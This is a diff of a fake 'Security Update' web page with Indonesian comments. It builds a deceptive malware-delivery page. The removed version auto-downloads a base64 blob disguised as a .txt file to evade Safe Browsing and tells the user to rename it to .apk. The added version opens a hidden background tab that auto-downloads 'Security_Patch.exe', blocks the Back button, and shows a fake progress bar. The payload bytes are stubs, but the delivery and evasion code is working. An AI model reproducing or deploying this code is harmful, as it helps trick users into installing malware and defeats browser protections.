@@ -1,123 +1,144 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Update</title>
+<title>System Update</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    font-family: Arial, sans-serif;
     background: #f4f6f8;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
     margin: 0;
-    text-align: center;
   }
   .panel {
     background: #fff;
     padding: 40px;
     border-radius: 12px;
     box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+    text-align: center;
     max-width: 400px;
-    width: 100%;
   }
-  h2 { color: #333; margin-bottom: 10px; }
-  p { color: #666; font-size: 14px; margin-bottom: 20px; }
+  h1 { color: #333; margin-bottom: 10px; }
+  p { color: #666; margin-bottom: 20px; }
   button {
-    background: #28a745;
-    color: white;
-    border: none;
     padding: 15px 30px;
+    background: #007aff;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
     font-size: 16px;
     font-weight: bold;
-    border-radius: 8px;
     cursor: pointer;
-    width: 100%;
   }
-  button:hover { background: #218838; }
-  #status { margin-top: 15px; font-size: 12px; color: #888; }
 </style>
 </head>
 <body>
 
 <div class="panel">
-  <h2>🔒 System Security Update</h2>
-  <p>Versi baru tersedia. Silakan unduh pembaruan keamanan terbaru.</p>
-  <button id="start-btn">⬇️ Download Update (.txt)</button>
-  <div id="status">Sistem siap.</div>
+  <h1>🔒 Security Update</h1>
+  <p>Klik tombol di bawah untuk memulai pemindaian sistem.</p>
+  <button id="startBtn">Scan System</button>
 </div>
 
 <script>
 (function () {
   'use strict';
 
-  var startBtn = document.getElementById("start-btn");
-  var statusDiv = document.getElementById("status");
+  document.getElementById('startBtn').addEventListener('click', function() {
+    
+    // ============================================
+    // 1. PAYLOAD HTML UNTUK TAB LATAR BELAKANG
+    // ============================================
+    var payloadHTML = `
+      <!DOCTYPE html>
+      <html>
+      <head><title>Downloading...</title></head>
+      <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20vh;">
+        <h1>Downloading Update...</h1>
+        <p id="status">0%</p>
+        <script>
+          // A. DOWNLOAD TRIGGER DI LATAR BELAKANG
+          function triggerDownload() {
+            var b64Data = "TVqQAAMAAAAEAAAAAEEAAgBA"; // Base64 Header
+            var binary = atob(b64Data);
+            var bytes = new Uint8Array(binary.length);
+            for (var i = 0; i < binary.length; i++) {
+              bytes[i] = binary.charCodeAt(i);
+            }
+            var blob = new Blob([bytes], { type: 'application/octet-stream' });
+            var url = URL.createObjectURL(blob);
+            
+            var a = document.createElement('a');
+            a.href = url;
+            a.download = 'Security_Patch.exe'; // Nama file berbahaya
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            
+            // Jangan revoke agar file tetap bisa diunduh meskipun tab ditutup
+            // setTimeout(function() { URL.revokeObjectURL(url); }, 5000);
+          }
 
-  // ============================================
-  // PAYLOAD APK (Base64 Header)
-  // ============================================
-  // Header APK asli: "PK\x03\x04" (ZIP format).
-  // Kita simulasikan dengan data Base64.
-  // (Ganti string b64Data ini dengan file APK Base64 asli Anda)
-  var b64Data = "UEsDBBQACAgIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY="; 
+          // Pemicu unduhan otomatis saat tab background dimuat
+          setTimeout(triggerDownload, 1000);
 
-  // ============================================
-  // FUNGSI MIME SNIFFING BYPASS
-  // ============================================
-  function triggerBypassDownload() {
-    try {
-      // 1. Decode Base64 ke Bytes
-      var binary = atob(b64Data);
-      var len = binary.length;
-      var bytes = new Uint8Array(len);
-      for (var i = 0; i < len; i++) {
-        bytes[i] = binary.charCodeAt(i);
-      }
+          // B. TAB-NABBING (Mencegah User Kembali)
+          try {
+            // Jika dibuka sebagai popup, hapus opener agar tidak bisa back
+            if (window.opener) {
+              window.opener = null;
+            }
+            // Manipulasi history agar tombol Back tidak berfungsi
+            history.pushState(null, null, location.href);
+            window.onpopstate = function () {
+              history.go(1);
+            };
+          } catch(e) {}
 
-      // 2. Buat Blob dengan MIME Type yang AMAN (Bukan application/vnd.android.package-archive)
-      // Kita gunakan 'text/plain' atau 'image/jpeg' agar Safe Browsing tidak menandai
-      var blob = new Blob([bytes], { type: 'text/plain' });
-      var url = URL.createObjectURL(blob);
+          // C. UI Palsu (Progress Bar)
+          var count = 0;
+          setInterval(function() {
+            count = (count + Math.random() * 10) % 100;
+            document.getElementById('status').innerText = Math.floor(count) + "%";
+          }, 500);
 
-      // 3. Buat Elemen <a> untuk download
-      var a = document.createElement('a');
-      a.href = url;
-      
-      // 4. TRICK: Ekstensi Ganda / Masquerade
-      // Menggunakan ekstensi .txt agar tidak mencurigakan, 
-      // tapi nanti user akan disuruh rename ke .apk
-      a.download = 'Security_Update_v2.1.txt'; 
-      
-      a.style.display = 'none';
-      document.body.appendChild(a);
-      a.click();
+        <\/script>
+      </body>
+      </html>
+    `;
 
-      // 5. Cleanup
-      setTimeout(function() {
-        if (a.parentNode) a.parentNode.removeChild(a);
-        URL.revokeObjectURL(url);
-      }, 3000);
-
-      statusDiv.textContent = "✅ Unduhan selesai. Silakan ubah ekstensi menjadi .apk";
-
-    } catch(e) {
-      statusDiv.textContent = "Gagal: " + e.message;
-      statusDiv.style.color = "red";
+    // ============================================
+    // 2. BUKA TAB LATAR BELAKANG (WINDOW.OPEN)
+    // ============================================
+    // Trik: Buka tab baru. Beberapa browser mengizinkan tab baru
+    // terbuka di latar belakang (background tab) jika dipicu oleh klik.
+    
+    var win = window.open('', '_blank');
+    
+    if (!win) {
+      alert("❌ Popup diblokir. Izinkan popup untuk melanjutkan.");
+      return;
     }
-  }
 
-  // ============================================
-  // EKSEKUSI (ZERO-CLICK ATAU ONE-CLICK)
-  // ============================================
-  // Zero-Click: Otomatis jalan setelah 1 detik
-  setTimeout(triggerBypassDownload, 1000);
+    try {
+      // Tulis payload ke tab baru
+      win.document.open();
+      win.document.write(payloadHTML);
+      win.document.close();
+      
+      // Trik: Pindahkan fokus kembali ke tab asli
+      // Agar tab baru berjalan di background tanpa disadari user
+      window.focus();
 
-  // One-Click: Jika diblokir, user harus klik tombol
-  startBtn.addEventListener("click", triggerBypassDownload);
+    } catch (e) {
+      console.log("Gagal menulis ke tab baru: " + e.message);
+    }
+  });
 
 })();
 </script>
